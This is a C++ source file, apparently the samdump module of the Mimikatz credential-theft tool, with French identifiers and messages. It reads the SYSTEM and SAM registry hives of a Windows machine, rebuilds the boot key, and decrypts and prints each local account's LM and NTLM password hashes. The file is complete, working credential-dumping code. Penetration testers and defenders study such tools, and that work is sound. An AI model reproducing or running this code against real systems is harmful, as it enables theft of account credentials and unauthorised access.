/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
*/
#include "mod_mimikatz_samdump.h"

vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_samdump::getMimiKatzCommands()
{
	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(full, L"hashes", L"Récupère la bootkey depuis une ruche SYSTEM puis les hashes depuis une ruche SAM"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(bootkey, L"bootkey", L"Récupère la bootkey depuis une ruche SYSTEM"));
	return monVector;
}

bool mod_mimikatz_samdump::bootkey(vector<wstring> * arguments)
{
	unsigned char bootkey[0x10];
	if(!arguments->empty())
		getBootKey(arguments->front(), bootkey);
	return true;
}

bool mod_mimikatz_samdump::full(vector<wstring> * arguments)
{
	if(!arguments->empty() && (arguments->size() >= 1 && arguments->size() <= 2))
	{
		unsigned char bootkey[0x10];
		if(getBootKey(arguments->front().c_str(), bootkey))
		{
			if(!getUsersAndHashes(arguments->back().c_str(), bootkey))
				wcout << L"Erreur lors de l\'exploration des ruches" << endl;
		}
	} else wcout << L"Erreur de syntaxe ; " << L"samdump rucheSystem rucheSam" << endl;

	return true;
}

void mod_mimikatz_samdump::RC4Crypt(BYTE* rc4_key, BYTE* ClearText, BYTE *EncryptBuffer)
{
	HCRYPTPROV hCryptProv = NULL; 
	HCRYPTKEY hKey = NULL;

	if(CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		KEY_BLOB DesKeyBlob;
		DesKeyBlob.dwDefault = 0x0208;
		DesKeyBlob.dwAlgID = CALG_RC4;
		DesKeyBlob.dwKeyLen = 0x10;
		RtlCopyMemory(DesKeyBlob.Key, rc4_key, sizeof(DesKeyBlob.Key));

		if(CryptImportKey(hCryptProv, (BYTE *)&DesKeyBlob, sizeof(DesKeyBlob), 0, CRYPT_EXPORTABLE, &hKey))
		{
			RtlCopyMemory(EncryptBuffer, ClearText, 0x10);
			DWORD dwWorkingBufferLength = 0x10;
			CryptEncrypt(hKey, NULL, TRUE, 0, EncryptBuffer, &dwWorkingBufferLength, dwWorkingBufferLength);
			CryptDestroyKey(hKey);
		}
		CryptReleaseContext(hCryptProv, 0);
	}
}

bool mod_mimikatz_samdump::getUsersAndHashes(wstring samHive, unsigned char bootkey[0x10])
{
	unsigned char qwe[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
	unsigned char num[] = "0123456789012345678901234567890123456789";
	
	bool reussite = false;

	mod_hive::hive * monHive = new mod_hive::hive();
	mod_hive::InitHive(monHive); 
	if(mod_hive::RegOpenHive(samHive.c_str(), monHive))
	{
		string * rootKey = new string();
		if(mod_hive::RegGetRootKey(monHive, rootKey))
		{
			string * keyAccountName = new string(*rootKey); keyAccountName->append("\\SAM\\Domains\\Account");
			string * valAccountName = new string("F");
			int longueurF = 0; unsigned char *bufferF = NULL;

			if(mod_hive::RegOpenKeyQueryValue(monHive, keyAccountName, valAccountName, &bufferF, &longueurF))
			{
				HCRYPTPROV hCryptProv = NULL;
				HCRYPTHASH hHash = NULL;
				if(CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
				{
					unsigned char md5hash[0x10] = {0};
					DWORD dwHashDataLen = sizeof(md5hash);
					CryptCreateHash(hCryptProv, CALG_MD5, 0, 0, &hHash);
					CryptHashData(hHash, bufferF + 0x70, 0x10, 0);
					CryptHashData(hHash, qwe, sizeof(qwe), 0);
					CryptHashData(hHash, bootkey, 0x10, 0);
					CryptHashData(hHash, num, sizeof(num), 0);
					CryptGetHashParam(hHash, HP_HASHVAL, md5hash, &dwHashDataLen, 0);
					CryptDestroyHash(hHash);
					CryptReleaseContext(hCryptProv, 0);
					unsigned char hbootkey[0x20] = {0};
					RC4Crypt(md5hash, bufferF + 0x80, hbootkey);

					string * keyUsers = new string(*rootKey); keyUsers->append("\\SAM\\Domains\\Account\\Users");
					mod_hive::nk_hdr * nodeUsers = new mod_hive::nk_hdr();
					if(mod_hive::RegOpenKey(monHive, keyUsers, &nodeUsers ))
					{
						vector<string> * keyNames = new vector<string>();
						if(mod_hive::RegEnumKey(monHive, nodeUsers, keyNames))
						{
							for(vector<string>::iterator maKey = keyNames->begin(); maKey != keyNames->end(); maKey++)
							{
								if(maKey->compare("Names") != 0)
								{
									string * keyUser = new string(*keyUsers); keyUser->append("\\"); keyUser->append(*maKey);
									string * valUser = new string("V");

									int longueurV = 0; unsigned char *bufferV = NULL;

									if(reussite = mod_hive::RegOpenKeyQueryValue(monHive, keyUser, valUser, &bufferV, &longueurV))
									{
										wcout << endl;
										DWORD32 rid = strtoul(maKey->c_str(), NULL, 16);
										wcout << L"Rid  : " << rid << endl;

										wstring * username = new wstring((wchar_t *) (bufferV + (int) (bufferV[0x0c] + 0xcc)), (*(int*)(bufferV + 0x10)) / 2);
										wcout << L"User : " << *username << endl;
										delete username;
									
										wcout << L"LM   : "; decryptHash(hbootkey, bufferV, 0x9c, rid, false);
										wcout << L"NTLM : "; decryptHash(hbootkey, bufferV, 0xa8, rid, true);
									
										delete bufferV;
									}
									delete keyUser;
								}
							}
						}
						delete keyNames;
					}
					delete nodeUsers, keyUsers;
				}
				delete[] bufferF;
			}
			delete valAccountName, keyAccountName;
		}
		delete rootKey;
	}
	delete monHive;

	return reussite;
}


bool mod_mimikatz_samdump::decryptHash(unsigned char hbootkey[0x20], unsigned char *bufferV, unsigned int hashOffset, DWORD32 rid, bool isNtlm)
{
	unsigned char ntpassword[] = "NTPASSWORD";
	unsigned char lmpassword[] = "LMPASSWORD";
	
	if(*(int *)(bufferV + hashOffset + 4) == 0x14)
	{
		HCRYPTPROV hCryptProv = NULL;
		HCRYPTHASH hHash = NULL;
		if(CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
		{
			unsigned char md5hash[0x10] = {0};
			DWORD dwHashDataLen = 0x10;
			CryptCreateHash(hCryptProv, CALG_MD5, 0, 0, &hHash);
			CryptHashData(hHash, hbootkey, 0x10, 0);
			CryptHashData(hHash, (BYTE *) &rid, sizeof(rid), 0);
			CryptHashData(hHash, isNtlm ? ntpassword : lmpassword, isNtlm ? sizeof(ntpassword) : sizeof(lmpassword), 0);
			CryptGetHashParam(hHash, HP_HASHVAL, md5hash, &dwHashDataLen, 0);
			CryptDestroyHash(hHash);
			CryptReleaseContext(hCryptProv, 0);
			unsigned char obfkey[0x10];
			RC4Crypt(md5hash, bufferV + *(int *)(bufferV + hashOffset) + 0xcc + sizeof(DWORD32), obfkey);

			if(CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
			{
				DESKEY_BLOB DesKeyBlob;
				HCRYPTKEY hKey = NULL;

				DWORD dwWorkingBufferLength;

				DesKeyBlob.BlobHeader.bType = PLAINTEXTKEYBLOB;
				DesKeyBlob.BlobHeader.bVersion = CUR_BLOB_VERSION;
				DesKeyBlob.BlobHeader.aiKeyAlg = CALG_DES;
				DesKeyBlob.BlobHeader.reserved = 0;
				DesKeyBlob.dwKeyLen = 8;
				
				sid_to_key1(rid, DesKeyBlob.Key);
				dwWorkingBufferLength = sizeof(obfkey) / 2;
				CryptImportKey(hCryptProv, (BYTE *) &DesKeyBlob, sizeof(DesKeyBlob), 0, CRYPT_EXPORTABLE, &hKey);
				CryptDecrypt(hKey, NULL, TRUE, 0, obfkey, &dwWorkingBufferLength);
				CryptDestroyKey(hKey);
				
				sid_to_key2(rid, DesKeyBlob.Key);
				dwWorkingBufferLength = sizeof(obfkey) / 2;
				CryptImportKey(hCryptProv, (BYTE *) &DesKeyBlob, sizeof(DesKeyBlob), 0, CRYPT_EXPORTABLE, &hKey);
				CryptDecrypt(hKey, NULL, TRUE, 0, obfkey + 8, &dwWorkingBufferLength);
				CryptDestroyKey(hKey);

				wcout << mod_text::stringOfHex(obfkey, sizeof(obfkey));
	
				CryptReleaseContext(hCryptProv, 0);
			}
		}
	}
	wcout << endl;
	return true;
}


bool mod_mimikatz_samdump::getBootKey(wstring systemHive, unsigned char bootkey[0x10])
{
	bool reussite = false;

	mod_hive::hive * monHive = new mod_hive::hive();
	mod_hive::InitHive(monHive);

	if(mod_hive::RegOpenHive(systemHive.c_str(), monHive))
	{
		string * rootKey = new string();
		if(mod_hive::RegGetRootKey(monHive, rootKey))
		{
			DWORD nControlSet = 0;
			if(getNControlSet(monHive, rootKey, &nControlSet))
			{
				stringstream  * monControlSet = new stringstream;
				*monControlSet << *rootKey << "\\ControlSet" <<  setw(3) << setfill('0') << nControlSet;
				string * fullControlSet = new string(monControlSet->str());
				delete monControlSet;

				wstring * computerName = new wstring();
				if(getComputerName(monHive, fullControlSet, computerName))
					wcout << L"Ordinateur : " << *computerName << endl;
				delete computerName;

				if(reussite = getBootKeyFromHive(monHive, fullControlSet, bootkey))
					wcout << L"BootKey    : " << mod_text::stringOfHex(bootkey, 0x10) << endl;
				delete fullControlSet;
			}
		}
		delete rootKey;
		mod_hive::RegCloseHive(monHive);
	}
	delete monHive;

	return reussite;
}

bool mod_mimikatz_samdump::getComputerName(mod_hive::hive * theHive, string * fullControlSet, wstring * computerName)
{
	bool reussite = false;

	string * keyComputerName = new string(*fullControlSet); keyComputerName->append("\\Control\\ComputerName\\ComputerName");
	string * valComputerName = new string("ComputerName");
	int longueur = 0; unsigned char *buffer = NULL;
	if(reussite = mod_hive::RegOpenKeyQueryValue(theHive, keyComputerName, valComputerName, &buffer, &longueur))
	{
		computerName->assign(reinterpret_cast<wchar_t *>(buffer), longueur / sizeof(wchar_t));
		delete[] buffer;
	}
	delete valComputerName;
	delete keyComputerName;

	return reussite;
}

bool mod_mimikatz_samdump::getBootKeyFromHive(mod_hive::hive * theHive, string * fullControlSet, unsigned char bootkey[0x10])
{
	bool reussite = false;

	unsigned char key[0x10];
	char *kn[] = {"JD", "Skew1", "GBG", "Data"};

	unsigned char p[] = {0xb, 0x6, 0x7, 0x1, 0x8, 0xa, 0xe, 0x0, 0x3, 0x5, 0x2, 0xf, 0xd, 0x9, 0xc, 0x4};
	for(unsigned int i = 0; i < sizeof(kn) / sizeof(char *); i++ )
	{
		string * maKey = new string(*fullControlSet); maKey->append("\\Control\\Lsa\\"); maKey->append(kn[i]);
		mod_hive::nk_hdr * n = new mod_hive::nk_hdr();

		if(reussite = mod_hive::RegOpenKey(theHive, maKey, &n))
		{
			char kv[9] = {0};
			unsigned char *b = mod_hive::read_data(theHive, n->classname_off + 0x1000);
			for(short j = 0; j < (n->classname_len / 2) && j < 8; j++)
				kv[j] = b[j*2];
			sscanf_s(kv, "%x", (unsigned int*) (&key[i*4]));
		}
		delete n, maKey;
	}

	if(reussite)
	{
		for(unsigned int i = 0; i < 0x10; i++)
			bootkey[i] = key[p[i]];
	}
	return reussite;
}

bool mod_mimikatz_samdump::getNControlSet(mod_hive::hive * theHive, string * rootKey, DWORD * nControlSet)
{
	bool reussite = false;

	string * selectKey = new string(*rootKey); selectKey->append("\\Select");
	string * nDefault = new string("Default");
	int longueur = 0; unsigned char *buffer = NULL;

	if(mod_hive::RegOpenKeyQueryValue(theHive, selectKey, nDefault, &buffer, &longueur))
	{
		if(reussite = (longueur == sizeof(DWORD)))
			*nControlSet = *(DWORD *) (buffer);
		delete[] buffer;
	}

	delete nDefault, selectKey;
	return reussite;
}

void mod_mimikatz_samdump::str_to_key(unsigned char *str, unsigned char *key)
{
	key[0] = str[0] >> 1;
	key[1] = ((str[0] & 0x01) <<6) | (str[1] >> 2);
	key[2] = ((str[1] & 0x03) <<5) | (str[2] >> 3);
	key[3] = ((str[2] & 0x07) <<4) | (str[3] >> 4);
	key[4] = ((str[3] & 0x0f) <<3) | (str[4] >> 5);
	key[5] = ((str[4] & 0x1f) <<2) | (str[5] >> 6);
	key[6] = ((str[5] & 0x3f) <<1) | (str[6] >> 7);
	key[7] = str[6] & 0x7f;
	for (unsigned int i = 0; i < 8; i++)
		key[i] = (key[i]<<1);
	des_set_odd_parity((DES_cblock *)key);
}

void mod_mimikatz_samdump::sid_to_key1(unsigned long sid, unsigned char deskey[8])
{
	unsigned char s[7];
	s[0] = s[4] =	(unsigned char)((sid)		& 0xff);
	s[1] = s[5] =	(unsigned char)((sid >> 8)	& 0xff);
	s[2] = s[6] =	(unsigned char)((sid >>16)	& 0xff);
	s[3] =			(unsigned char)((sid >>24)	& 0xff);
	str_to_key(s, deskey);
}

void mod_mimikatz_samdump::sid_to_key2(unsigned long sid, unsigned char deskey[8])
{
	unsigned char s[7];

	s[0] = s[4] =	(unsigned char)((sid >>24)	& 0xff);
	s[1] = s[5] =	(unsigned char)((sid)		& 0xff);
	s[2] = s[6] =	(unsigned char)((sid >> 8)	& 0xff);
	s[3] =			(unsigned char)((sid >>16)	& 0xff);
	str_to_key(s, deskey);
}

void mod_mimikatz_samdump::des_set_odd_parity(DES_cblock * key)
{
	static const unsigned char odd_parity[256] = {
	  1,  1,  2,  2,  4,  4,  7,  7,  8,  8, 11, 11, 13, 13, 14, 14,
	 16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
	 32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
	 49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
	 64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
	 81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
	 97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
	112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
	128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
	145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
	161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
	176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
	193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
	208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
	224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
	241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254};

	for (unsigned int i = 0; i < 8; i++)
		(*key)[i] = odd_parity[(*key)[i]];
}